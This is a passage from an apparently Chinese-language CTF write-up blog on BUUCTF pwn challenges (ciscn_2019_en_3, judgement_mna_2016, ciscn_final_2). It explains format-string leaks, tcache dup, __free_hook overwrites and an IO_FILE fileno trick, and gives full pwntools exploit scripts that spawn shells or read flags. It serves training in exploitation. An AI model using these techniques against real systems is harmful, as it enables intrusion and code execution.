class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>libcbase = lsm_a - libc.sym['__libc_start_main']</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>sys_a = libcbase + libc.sym['system']</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>bs_a = libcbase + next(libc.search(b'/bin/sh'))</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>main_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>bs_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'do?'</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"ciscn_2019_en_3\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_2019_en_3\">#</a> ciscn_2019_en_3</h1>\n<p>** 考点：**heap, uaf, tcache dup, free_hook, fmtstr</p>\n<p>开始有格式化字符串漏洞，但是不能利用 <code>%N$</code>  的形式，所以一个个输出。有个 <code>_IO_2_1_stderr_</code> 的 libc 函数，将其地址泄露，计算出 system 地址和 <code>__free_hook</code>  地址，然后利用 tcache dup 直接修改 <code>__free_hook</code> 。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'ciscn_2019_en_3'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26713</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b printf'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'choice:'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span> content<span class=\"token operator\">=</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'size of story: \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'inpute the story: \\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'index:\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'name?\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'%p%p%p%p%p%p.%p\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'.'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>stderr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[+]stderr:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>stderr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>obj <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'_IO_2_1_stderr_'</span><span class=\"token punctuation\">,</span> stderr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>libcbase <span class=\"token operator\">=</span> stderr <span class=\"token operator\">-</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'_IO_2_1_stderr_'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>fh_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'ID.\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'114514'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>fh_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"judgement_mna_2016\"><a class=\"markdownIt-Anchor\" href=\"#judgement_mna_2016\">#</a> judgement_mna_2016</h1>\n<p>** 考点：**fmtstr</p>\n<p>开始程序将 flag 文件读入了内存中，因此找到偏移，利用 format_string 漏洞直接输出。</p>\n<p><img data-src=\"./image-20231120154115924.png\" alt=\"image-20231120154115924\"></p>\n<p>两个地址相减除以 4，得到 flag 的偏移量，即 <code>%28$n</code> 。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'judgement_mna_2016'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./\"</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25488</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b printf'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token number\">0xfda0</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>strg <span class=\"token operator\">=</span> <span class=\"token number\">0xfd30</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">'%&#123;&#125;$s\\n'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>flag<span class=\"token operator\">-</span>strg<span class=\"token punctuation\">)</span><span class=\"token operator\">//</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'flag >> '</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'&#125;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"ciscn_final_2\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_final_2\">#</a> *ciscn_final_2</h1>\n<p>** 考点：**heap, IO_FILE, tcache dup, orw</p>\n<p>**libc 版本：**libc6_2.27_3ubunto1_amd64</p>\n<h2 id=\"分析\"><a class=\"markdownIt-Anchor\" href=\"#分析\">#</a> 分析</h2>\n<p>保护全开。沙盒禁用了 execve。</p>\n<p><img data-src=\"./image-20231120154641760.png\" alt=\"image-20231120154641760\"></p>\n<h3 id=\"flag文件\"><a class=\"markdownIt-Anchor\" href=\"#flag文件\">#</a> flag 文件</h3>\n<p>程序一开始将 flag 文件读入，并利用 <code>dup2(fd, 666);</code>  将 flag 文件标识符复制到了 666。由于 <code>execve</code>  被禁用因此只能利用 orw 的思路。因此可以修改 <code>stdin</code>  的 <code>IO_FILE</code>  结构体的 <code>flagno</code>  属性为 <code>666</code> ，这样当执行 <code>scanf</code>  时，将会直接从 flag 文件中读取。</p>\n<p><img data-src=\"./image-20231121010743447.png\" alt=\"image-20231121010743447\"></p>\n<p>退出函数中包含一次输入和对应的一次输出，刚好适合用于 orw 的 read 和 write 环节。</p>\n<p><img data-src=\"./image-20231121011050461.png\" alt=\"image-20231121011050461\"></p>\n<h3 id=\"分配函数\"><a class=\"markdownIt-Anchor\" href=\"#分配函数\">#</a> 分配函数</h3>\n<p>这题的堆分配功能比较独特。首先分配大小固定为大块分配 <code>malloc(0x20)</code> ，实际大小 0x30。小块分配 <code>malloc(0x10)</code> ，实际大小 0x20。固定将分配后地址分别放在数组 <code>int_pt[0]</code>  和 <code>int_pt[1]</code>  中，可无限次分配，新分配块的地址将会直接覆盖原地址。每次分配后将<strong> bool 置 1</strong>。</p>\n<p>分配的同时往堆块内写入数据。这次写入数据的方式也不同，是获取用户输入的数字字符串直接转换成数值填入对应地址，即类似 <code>scanf(&quot;%d&quot;, &amp;ptr)</code>  的输入方式。~~ 不用自己手动类型转换啦！~~ 该做法的缺点是能修改的字节有限且固定。两种 chunk 对应可写的字节数如下：</p>\n<ul>\n<li><code>malloc(0x20)</code> ：可写入 int 类型，即 4 字节。</li>\n<li><code>malloc(0x10)</code> ：可写入 short 类型，即 2 字节。</li>\n</ul>\n<p>同时，该函数会往 ** <code>chunk_addr+8字节</code> <strong>的地址处也复制一份数字。该做法的作用是，在释放块后，留有</strong> <code>chunk_addr+8字节</code>  ** 处的数据供我们利用。</p>\n<h3 id=\"释放函数\"><a class=\"markdownIt-Anchor\" href=\"#释放函数\">#</a> 释放函数</h3>\n<p>在 bool 为 1 时可以选择释放大 chunk 或小 chunk。释放 chunk 后，没有清空地址。同时将<strong> bool 置 0</strong>。由于 bool 的存在，所以不能连续释放两个相同的 chunk，只能借助另一类块的分配来实现 tcache dup。比如，要分配一个 0x30 大小的 chunk 进行 tcache dup，应执行以下命令。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 以下函数定义见完整代码</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 该代码仅做实例，未出现在 exp 中</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\t<span class=\"token comment\"># 这是那个 0x30 大小的 chunk</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\t<span class=\"token comment\">#这是借用的 0x20 大小的 chunk</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 此时构成 tcache bin 循环 可以 dup</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> target<span class=\"token punctuation\">)</span>\t<span class=\"token comment\"># target 为要实现任意地址读写的地址</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\t\t\t<span class=\"token comment\"># 将重复块弹出 tcache bin，同时使得 bin 指向 target</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span>\t<span class=\"token comment\"># value 为往 target 写入的数值</span></pre></td></tr></table></figure><h3 id=\"输出函数\"><a class=\"markdownIt-Anchor\" href=\"#输出函数\">#</a> 输出函数</h3>\n<p>无条件以数字形式输出数据。可选择大块或小块。但是输出依旧限制了字节数。同分配函数所写的一般。比如 8 字节的数据 <code>0x1122334455667788</code> ，对于大块则只会输出 <code>0x55667788</code> （小端字节序）。</p>\n<h2 id=\"利用-2\"><a class=\"markdownIt-Anchor\" href=\"#利用-2\">#</a> 利用</h2>\n<p>常规思路是释放大 chunk 获得 libc 地址，然后直接修改 <code>__malloc_hook</code>  或者 <code>__free_hook</code> 。但是由于 execve 被禁用，因此只能利用 orw。但依旧是要先泄露 libc 地址，然后计算得到 stdin 的地址再往 flagno 处写入数值 666。</p>\n<h3 id=\"地址覆盖\"><a class=\"markdownIt-Anchor\" href=\"#地址覆盖\">#</a> 地址覆盖</h3>\n<p>由于我们泄露和修改的字节数固定为 4 字节或 2 字节。由于 64 位程序的地址为 8 字节，因此我们只能进行低位覆盖。由于整型输入的缘故，对于 int 哪怕只输入了 short 范围的数据，也会把 int 中的高 2 位置零或置 0xff。因此泄露和覆盖所用的 chunk 类型应该一致，或者使用 int 泄露，short 修改。</p>\n<p>其次，高位数据无法修改。因此只能在现有的堆块地址或者 mainarena 地址上修改。</p>\n<h3 id=\"泄露libc地址\"><a class=\"markdownIt-Anchor\" href=\"#泄露libc地址\">#</a> 泄露 libc 地址</h3>\n<p>首先得构造 0x400 以上的 chunk 然后释放。因此第一次任意地址读写需要修改某个 chunk 的 size 区域。</p>\n<p>先分配大量 chunk，确保构造的 chunk 拥有与之相邻的 “合法” chunk。然后构造 dup。在构造好 dup 的循环链时，将该循环的 chunk 打印，获得该 chunk 自身的地址。由此推算第一个 chunk 的地址。然后利用 dup 将第一个 chunk 的大小修改为对应的大小。</p>\n<p>为了保存第一个 chunk 的地址，中间用于填充够 0x400 的 chunk 必须为同一类，这里第一个 chunk 为小，其后的 chunk 均为大。同时，由于构造 dup 时需一个不同类配合，因此需要先将这个唯一的小 chunk 释放。</p>\n<h3 id=\"修改flagno\"><a class=\"markdownIt-Anchor\" href=\"#修改flagno\">#</a> 修改 flagno</h3>\n<p>泄露 <code>mainarena+96</code>  的地址后，计算出 <code>_IO_2_1_stdin_</code> 的地址， <code>_IO_2_1_stdin_ + 112</code>  即为 flagno 所在位置。此时利用上一步泄露出来的 mainarena。由于存放的 chunk 是处于 unsorted bin 之中，直接分配一个 chunk，并修改低位数据为 flagno 的地址低位。然后 dup。</p>\n<p>这里 dup 使用的是小块，上一次 dup 用的是大块。** 因为 dup 后 tcache bin 的计数器会变为 - 1，此时释放堆块，-1 会识别为很大的数，超过 8，释放的堆块便会放入 fastbin，无法利用 tcache dup。** 虽然再多次 free 可以使得计数器变为 0，但没有直接换人方便。</p>\n<p>修改好 stdin 的 flagno 之后，直接退出。便完成了 orw。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'ciscn_final_2'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29938</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span 